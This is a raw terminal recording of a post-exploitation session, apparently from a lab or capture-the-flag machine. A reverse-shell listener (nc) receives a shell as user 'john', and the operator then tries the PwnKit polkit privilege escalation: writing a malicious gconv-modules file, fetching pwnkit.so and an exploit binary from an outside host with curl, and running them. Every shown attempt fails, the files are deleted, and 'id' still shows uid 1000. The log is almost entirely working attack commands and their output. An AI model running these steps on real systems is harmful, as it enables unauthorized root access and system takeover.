@@ -1,0 +1,260 @@
+Script started on 2026-09-27 06:16:58+03:00 [COMMAND="rlwrap nc -nlvp 6047" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 55679
+[Kbash: cannot set terminal process group (4896): Inappropriate ioctl for device
+bash: no job control in this shell
+john$ [Kjohn$ [K[?2004hjohn$ [7mrm -rf '/tmp/GCONV_PATH=.'[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rf '/tmp/GCONV_PATH=.'
+[Krm -rf '/tmp/GCONV_PATH=.'[Krm -rf '/tmp/GCONV_PATH=.'[Krm -rf '/tmp/GCONV_PATH=.'
+john$ [Kjohn$ [K[?2004hjohn$ ls [K[K[Kcd /tmp[?2004l[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp[Kcd /tmp[Kcd /tmp
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls
+eop
+pwnkit
+pwnkit.c
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ r, [K[Km -rfv eop pwnkit pwnkit.c[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rfv eop pwnkit pwnkit.c
+[Krm -rfv eop pwnkit pwnkit.c[Krm -rfv eop pwnkit pwnkit.c[Krm -rfv eop pwnkit pwnkit.c
+removed 'eop'
+removed 'pwnkit/gconv-modules'
+removed directory 'pwnkit'
+removed 'pwnkit.c'
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ [7mmkdir -p pwnkit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hmkdir -p pwnkit
+[Kmkdir -p pwnkit[Kmkdir -p pwnkit[Kmkdir -p pwnkit
+john$ [Kjohn$ [K[?2004hjohn$ [7mecho 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hecho 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules
+[Kecho 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules[Kecho 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules[Kecho 'module UTF-8// PWNKIT// pwnkit 1' > pwnkit/gconv-modules
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls
+pwnkit
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ ls pwnkit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hls pwnkit
+[Kls pwnkit
+gconv-modules
+john$ [Kjohn$ [K[?2004hjohn$ cat pwnki [Kt/gconv-modules[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcat pwnkit/gconv-modules
+[Kcat pwnkit/gconv-modules[Kcat pwnkit/gconv-modules[Kcat pwnkit/gconv-modules
+module UTF-8// PWNKIT// pwnkit 1
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -o pwnkit/pwnkit.so http://192.168.131.92:8008/pwnkit.so[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o pwnkit/pwnkit.so http://192.168.131.92:8008/pwnkit.so
+[Kcurl -o pwnkit/pwnkit.so http://192.168.131.92:8008/pwnkit.so[Kcurl -o pwnkit/pwnkit.so http://192.168.131.92:8008/pwnkit.so[Kcurl -o pwnkit/pwnkit.so http://192.168.131.92:8008/pwnkit.so
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0 15560    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100 15560  100 15560    0     0  18457      0 --:--:-- --:--:-- --:--:-- 18436
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -o exploit http://192.168.131.92:8008/exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/exploit
+[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100 15960  100 15960    0     0  18115      0 --:--:-- --:--:-- --:--:-- 18095
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+exploit
+pwnkit
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ ls -al[?2004l[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 60
+drwxrwxrwt 11 root root  4096 Sep 27 03:20 .
+drwxr-xr-x 24 root root  4096 Jan  3  2021 ..
+drwxrwxrwt  2 root root  4096 Sep 27 02:12 .ICE-unix
+drwxrwxrwt  2 root root  4096 Sep 27 02:12 .Test-unix
+drwxrwxrwt  2 root root  4096 Sep 27 02:12 .X11-unix
+drwxrwxrwt  2 root root  4096 Sep 27 02:12 .XIM-unix
+drwxrwxrwt  2 root root  4096 Sep 27 02:12 .font-unix
+-rw-rw-r--  1 john john 15960 Sep 27 03:20 exploit
+drwxrwxr-x  2 john john  4096 Sep 27 03:20 pwnkit
+drwx------  3 root root  4096 Sep 27 02:12 systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+drwx------  3 root root  4096 Sep 27 02:12 systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+drwx------  3 root root  4096 Sep 27 02:12 systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ [7mchmod +x exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x exploit
+[Kchmod +x exploit[Kchmod +x exploit[Kchmod +x exploit
+john$ [Kjohn$ [K[?2004hjohn$ [7m./exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h./exploit
+[K./exploit[K./exploit[K./exploit
+./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
+john$ [Kjohn$ [K[?2004hjohn$ r, [K[Km -rfv exploit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rfv exploit
+[Krm -rfv exploit
+removed 'exploit'
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -o exploit http://192.168.131.92:8008/exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/exploit
+[Kcurl -o exploit http://192.168.131.92:8008/exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  9  747k    9 69796    0     0  64446      0  0:00:11  0:00:01  0:00:10 64387 37  747k   37  277k    0     0   133k      0  0:00:05  0:00:02  0:00:03  133k[K 37  747k   37  277k    0     0   133k      0  0:00:05  0:00:02  0:00:03  133k[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  9  747k    9 69796    0     0  64446      0  0:00:11  0:00:01  0:00:10 64387 37  747k   37  277k    0     0   133k      0  0:00:05  0:00:02  0:00:03  133k[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  9  747k    9 69796    0     0  64446      0  0:00:11  0:00:01  0:00:10 64387 37  747k   37  277k    0     0   133k      0  0:00:05  0:00:02  0:00:03  133k 89  747k   89  669k    0     0   213k      0  0:00:03  0:00:03 --:--:--  213k100  747k  100  747k    0     0   217k      0  0:00:03  0:00:03 --:--:--  217k
+john$ [Kjohn$ [K[?2004hjohn$ [7mchmod +x exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x exploit
+[Kchmod +x exploit[Kchmod +x exploit[Kchmod +x exploit
+john$ [Kjohn$ [K[?2004hjohn$ [7m./exploit[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h./exploit
+[K./exploit[K./exploit[K./exploit
+GLib: Cannot convert message: Could not open converter from “UTF-8” to “ryaagard”
+Cannot run program pwnkit: No such file or directory
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+exploit
+pwnkit
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ ls./exploit[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[C[34@url -o exploit http://192.168.131.92:8008/[C[C[C[C[C[C[C[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rfv exploit
+[Krm -rfv exploit
+removed 'exploit'
+john$ [Kjohn$ [K[?2004hjohn$ rm -rfv exploit[C[C[C[C[C[Cls[K./exploit[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[C[6P./[C[C[C[C[C[C[C[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[10Pls -al[Kcurl -o exploit http://192.168.131.92:8008/exploit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/exploit
+[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0  6584    0     0   4286      0  0:02:58  0:00:01  0:02:57  4283[K  0  747k    0  6584    0     0   4286      0  0:02:58  0:00:01  0:02:57  4283[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0  6584    0     0   4286      0  0:02:58  0:00:01  0:02:57  4283[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0  6584    0     0   4286      0  0:02:58  0:00:01  0:02:57  4283 15  747k   15  115k    0     0  47316      0  0:00:16  0:00:02  0:00:14 47297[K 15  747k   15  115k    0     0  47316      0  0:00:16  0:00:02  0:00:14 47297[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0  6584    0     0   4286      0  0:02:58  0:00:01  0:02:57  4283 15  747k   15  115k    0     0  47316      0  0:00:16  0:00:02  0:00:14 47297 54  747k   54  407k    0     0   116k      0  0:00:06  0:00:03  0:00:03  116k[K 54  747k   54  407k    0     0   116k      0  0:00:06  0:00:03  0:00:03  116k[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0  6584    0     0   4286      0  0:02:58  0:00:01  0:02:57  4283 15  747k   15  115k    0     0  47316      0  0:00:16  0:00:02  0:00:14 47297 54  747k   54  407k    0     0   116k      0  0:00:06  0:00:03  0:00:03  116k[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0  6584    0     0   4286      0  0:02:58  0:00:01  0:02:57  4283 15  747k   15  115k    0     0  47316      0  0:00:16  0:00:02  0:00:14 47297 54  747k   54  407k    0     0   116k      0  0:00:06  0:00:03  0:00:03  116k100  747k  100  747k    0     0   176k      0  0:00:04  0:00:04 --:--:--  176k
+john$ [Kjohn$ [K[?2004hjohn$ curl -o exploit http://192.168.131.92:8008/exploit[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[Cls[K./exploit[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x exploit
+[Kchmod +x exploit[Kchmod +x exploit[Kchmod +x exploit
+john$ [Kjohn$ [K[?2004hjohn$ chmod +x exploit[C[C[C[C[C[C[C[34@url -o exploit http://192.168.131.92:8008/[C[C[C[C[C[C[C[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[Cls[Kchmod +x exploit[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[C[6P./[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h./exploit
+[K./exploit
+GLib: Cannot convert message: Could not open converter from “UTF-8” to “ryaagard”
+Cannot run program PATH=.: No such file or directory
+john$ [Kjohn$ [K[?2004hjohn$ ./exploit[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[C[34@url -o exploit http://192.168.131.92:8008/[C[C[C[C[C[C[C[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[Cls[Krm -rfv exploit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rfv exploit
+[Krm -rfv exploit[Krm -rfv exploit[Krm -rfv exploit
+removed 'exploit'
+john$ [Kjohn$ [K[?2004hjohn$ rm -rfv exploit[C[C[C[C[C[C[6P./[C[C[C[C[C[C[C[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kchmod +x exploit[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[C[6P./[C[C[C[C[C[C[C[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[10Pls -alcurl -o exploit http://192.168.131.92:8008/exploit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/exploit
+[Kcurl -o exploit http://192.168.131.92:8008/exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K  0  747k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0 15  747k   15  113k    0     0  48649      0  0:00:15  0:00:02  0:00:13 48629[K 15  747k   15  113k    0     0  48649      0  0:00:15  0:00:02  0:00:13 48629[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0 15  747k   15  113k    0     0  48649      0  0:00:15  0:00:02  0:00:13 48629 42  747k   42  316k    0     0  95556      0  0:00:08  0:00:03  0:00:05 95528[K 42  747k   42  316k    0     0  95556      0  0:00:08  0:00:03  0:00:05 95528[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0 15  747k   15  113k    0     0  48649      0  0:00:15  0:00:02  0:00:13 48629 42  747k   42  316k    0     0  95556      0  0:00:08  0:00:03  0:00:05 95528[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0 15  747k   15  113k    0     0  48649      0  0:00:15  0:00:02  0:00:13 48629 42  747k   42  316k    0     0  95556      0  0:00:08  0:00:03  0:00:05 95528 68  747k   68  511k    0     0   115k      0  0:00:06  0:00:04  0:00:02  115k[K 68  747k   68  511k    0     0   115k      0  0:00:06  0:00:04  0:00:02  115k[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0  747k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0 15  747k   15  113k    0     0  48649      0  0:00:15  0:00:02  0:00:13 48629 42  747k   42  316k    0     0  95556      0  0:00:08  0:00:03  0:00:05 95528 68  747k   68  511k    0     0   115k      0  0:00:06  0:00:04  0:00:02  115k 97  747k   97  731k    0     0   134k      0  0:00:05  0:00:05 --:--:--  178k100  747k  100  747k    0     0   137k      0  0:00:05  0:00:05 --:--:--  190k
+john$ [Kjohn$ [K[?2004hjohn$ curl -o exploit http://192.168.131.92:8008/exploit[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[C[6P./[C[C[C[C[C[C[C[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x exploit
+[Kchmod +x exploit[Kchmod +x exploit[Kchmod +x exploit
+john$ [Kjohn$ [K[?2004hjohn$ chmod +x exploit[C[C[C[C[C[C[C[34@url -o exploit http://192.168.131.92:8008/[C[C[C[C[C[C[C[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[C[1@chmod +x[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kchmod +x exploit[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[C[6P./[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h./exploit
+[K./exploit[K./exploit[K./exploit
+GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
+Cannot run program SHELL=ryaagard: No such file or directory
+john$ [Kjohn$ [K[?2004hjohn$ ./exploit[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[C[34@url -o exploit http://192.168.131.92:8008/[C[C[C[C[C[C[C[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rfv exploit
+[Krm -rfv exploit[Krm -rfv exploit[Krm -rfv exploit
+removed 'exploit'
+john$ [Kjohn$ [K[?2004hjohn$ rm -rfv exploit[C[C[C[C[C[C[6P./[C[C[C[C[C[C[C[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@chmod +x[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kchmod +x exploit[C[C[C[C[C[C[7P./[C[C[C[C[C[C[C[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[C[34@url -o exploit http://192.168.131.92:8008/[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o exploit http://192.168.131.92:8008/exploit
+[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit[Kcurl -o exploit http://192.168.131.92:8008/exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0  8  747k    8 65620    0     0  20221      0  0:00:37  0:00:03  0:00:34 20215[K  8  747k    8 65620    0     0  20221      0  0:00:37  0:00:03  0:00:34 20215[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0  8  747k    8 65620    0     0  20221      0  0:00:37  0:00:03  0:00:34 20215[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0  8  747k    8 65620    0     0  20221      0  0:00:37  0:00:03  0:00:34 20215 61  747k   61  463k    0     0  99417      0  0:00:07  0:00:04  0:00:03 99396100  747k  100  747k    0     0   148k      0  0:00:05  0:00:05 --:--:--  157k
+john$ [Kjohn$ [K[?2004hjohn$ curl -o exploit http://192.168.131.92:8008/exploit[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[C[6P./[C[C[C[C[C[C[C[C[C[C[C[C[C[7@chmod +x [C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x exploit
+[Kchmod +x exploit[Kchmod +x exploit[Kchmod +x exploit
+john$ [Kjohn$ [K[?2004hjohn$ chmod +x exploit[C[C[C[C[C[C[C[34@url -o exploit http://192.168.131.92:8008/[C[C[C[C[C[C[C[C[C[C[C[C[Crm -rfv exploit[K[C[C[C[C[C[C[1@chmod +x[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@chmod +x[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Prm -rfv[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kchmod +x exploit[C[C[C[C[C[C[7P./[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h./exploit
+[K./exploit[K./exploit[K./exploit
+GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
+Cannot run program SHELL=/bin/sh: No such file or directory
+john$ [Kjohn$ [K[?2004hjohn$ [7mls /tmp/pwnkit/gconv-modules /tmp/pwnkit/pwnkit.so[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hls /tmp/pwnkit/gconv-modules /tmp/pwnkit/pwnkit.so
+[Kls /tmp/pwnkit/gconv-modules /tmp/pwnkit/pwnkit.so[Kls /tmp/pwnkit/gconv-modules /tmp/pwnkit/pwnkit.so[Kls /tmp/pwnkit/gconv-modules /tmp/pwnkit/pwnkit.so
+/tmp/pwnkit/gconv-modules
+/tmp/pwnkit/pwnkit.so
+john$ [Kjohn$ [K[?2004hjohn$ [7mcat /tmp/pwnkit/gconv-modules[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcat /tmp/pwnkit/gconv-modules
+[Kcat /tmp/pwnkit/gconv-modules[Kcat /tmp/pwnkit/gconv-modules[Kcat /tmp/pwnkit/gconv-modules
+module UTF-8// PWNKIT// pwnkit 1
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+exploit
+pwnkit
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-apache2.service-PYRTVx
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-resolved.service-zG1VTA
+systemd-private-1ba0a15f249043cba09ffdf4c1401584-systemd-timesyncd.service-XQT62N
+john$ [Kjohn$ [K[?2004hjohn$ rm -rfv ex        [Kploit pwnkit[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hrm -rfv exploit pwnkit
+[K[K[?2004h[?2004l[?2004h
+[K[K[?2004hid[?2004l[K[?2004hid
+[Krm -rfv exploit pwnkit[Krm -rfv exploit pwnkit[Krm -rfv exploit pwnkit
+removed 'exploit'
+removed 'pwnkit/pwnkit.so'
+removed 'pwnkit/gconv-modules'
+removed directory 'pwnkit'
+john$ 
+john$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),30(dip),46(plugdev),1001(blocked)
